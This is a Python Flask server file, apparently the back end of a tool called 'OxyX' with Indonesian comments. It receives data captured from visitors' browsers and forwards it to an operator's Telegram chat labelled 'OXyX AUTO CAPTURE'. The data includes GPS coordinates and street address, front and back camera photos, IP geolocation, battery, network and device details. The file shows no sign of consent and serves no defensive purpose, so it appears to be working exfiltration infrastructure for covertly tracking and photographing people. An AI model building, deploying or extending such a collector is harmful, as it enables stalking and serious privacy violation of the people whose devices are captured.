from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
import json
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Configuration
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', 'YOUR_BOT_TOKEN')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', 'YOUR_CHAT_ID')

@app.route('/api/collect', methods=['POST', 'GET', 'OPTIONS'])
def collect():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'}), 200
    
    try:
        # Get data from request
        if request.method == 'POST':
            data = request.get_json()
        else:
            data = request.args.to_dict()
        
        # Add server metadata
        data['server_received'] = datetime.utcnow().isoformat()
        data['client_ip'] = request.remote_addr
        data['user_agent'] = request.headers.get('User-Agent', 'Unknown')
        data['method'] = request.method
        
        print(f"📥 Data received from {data['client_ip']}")
        
        # Format message for Telegram
        message = format_telegram_message(data)
        
        # Send to Telegram
        send_telegram_message(ADMIN_CHAT_ID, message)
        
        # Log to console
        print(f"✅ Data sent to Telegram")
        
        return jsonify({
            'status': 'success',
            'message': 'Data collected successfully',
            'timestamp': datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def format_telegram_message(data):
    """Format data untuk Telegram dengan detail lengkap"""
    
    # Location info
    location_info = ""
    if data.get('location'):
        loc = data['location']
        if isinstance(loc, dict):
            location_info = f"""
📍 **LOKASI GPS:**
   • Latitude: `{loc.get('lat', 'N/A')}`
   • Longitude: `{loc.get('lon', 'N/A')}`
   • Akurasi: {loc.get('accuracy', 'N/A')}
   • Alamat: {loc.get('address', 'N/A')}
   • Jalan: {loc.get('road', 'N/A')}
   • Kota: {loc.get('city', 'N/A')}
   • Negara: {loc.get('country', 'N/A')}
            """
    elif data.get('ipInfo'):
        ip = data['ipInfo']
        location_info = f"""
📍 **LOKASI IP:**
   • IP: `{ip.get('ip', 'N/A')}`
   • Kota: {ip.get('city', 'N/A')}
   • Region: {ip.get('region', 'N/A')}
   • Negara: {ip.get('country', 'N/A')}
   • ISP: {ip.get('isp', 'N/A')}
   • Latitude: {ip.get('latitude', 'N/A')}
   • Longitude: {ip.get('longitude', 'N/A')}
            """
    
    # Photos info
    photos_info = ""
    if data.get('photos'):
        photos = data['photos']
        photos_info = f"""
📸 **FOTO:**
   • Jumlah: {len(photos)} foto
   • Depan: {'✅' if any(p.get('type') == 'front' for p in photos) else '❌'}
   • Belakang: {'✅' if any(p.get('type') == 'back' for p in photos) else '❌'}
   • Resolusi: {photos[0].get('resolution', 'N/A') if photos else 'N/A'}
            """
    
    # Battery info
    battery_info = ""
    if data.get('battery'):
        bat = data['battery']
        battery_info = f"""
🔋 **BATERAI:**
   • Level: {bat.get('level', 'N/A')}
   • Charging: {bat.get('charging', 'N/A')}
   • Charging Time: {bat.get('chargingTime', 'N/A')}
            """
    
    # Network info
    network_info = ""
    if data.get('network'):
        net = data['network']
        network_info = f"""
📶 **JARINGAN:**
   • Tipe: {net.get('type', 'N/A')}
   • Effective Type: {net.get('effectiveType', 'N/A')}
   • Speed: {net.get('downlink', 'N/A')}
   • Latency: {net.get('rtt', 'N/A')}
   • Save Data: {net.get('saveData', 'N/A')}
            """
    
    # Device info
    device_info = f"""
📱 **DEVICE:**
   • Platform: {data.get('platform', 'N/A')}
   • User Agent: {data.get('userAgent', 'N/A')[:100]}...
   • Screen: {data.get('screen', 'N/A')}
   • Language: {data.get('language', 'N/A')}
   • Timezone: {data.get('timezone', 'N/A')}
   • IP Client: {data.get('client_ip', 'N/A')}
            """
    
    # Compose final message
    message = f"""
🔴 **OXyX AUTO CAPTURE** 🔴

📅 **Timestamp:** {data.get('timestamp', 'N/A')}
🌐 **URL:** {data.get('url', request.host_url)}

{location_info}
{photos_info}
{battery_info}
{network_info}
{device_info}

🖥️ **SERVER INFO:**
   • Received: {data.get('server_received', 'N/A')}
   • Method: {data.get('method', 'N/A')}

#OxyX #{data.get('platform', 'Unknown').replace(' ', '')}
    """
    
    return message.strip()

def send_telegram_message(chat_id, text):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "Markdown",
            "disable_web_page_preview": True
        }
        
        # Also try to send photo if available
        if 'photos' in text.lower():
            payload['text'] = text[:4000]  # Trim if too long
        
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Telegram error: {e}")
        return None

@app.route('/api/ping', methods=['GET'])
def ping():
    """Health check endpoint"""
    return jsonify({
        'status': 'alive',
        'service': 'OxyX API',
        'timestamp': datetime.utcnow().isoformat(),
        'endpoints': {
            'POST /api/collect': 'Collect data',
            'GET /api/ping': 'Health check'
        }
    })

@app.route('/')
def home():
    return """
    <h1>OxyX API</h1>
    <p>API is running</p>
    <ul>
        <li>POST /api/collect - Collect data</li>
        <li>GET /api/ping - Health check</li>
    </ul>
    """

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
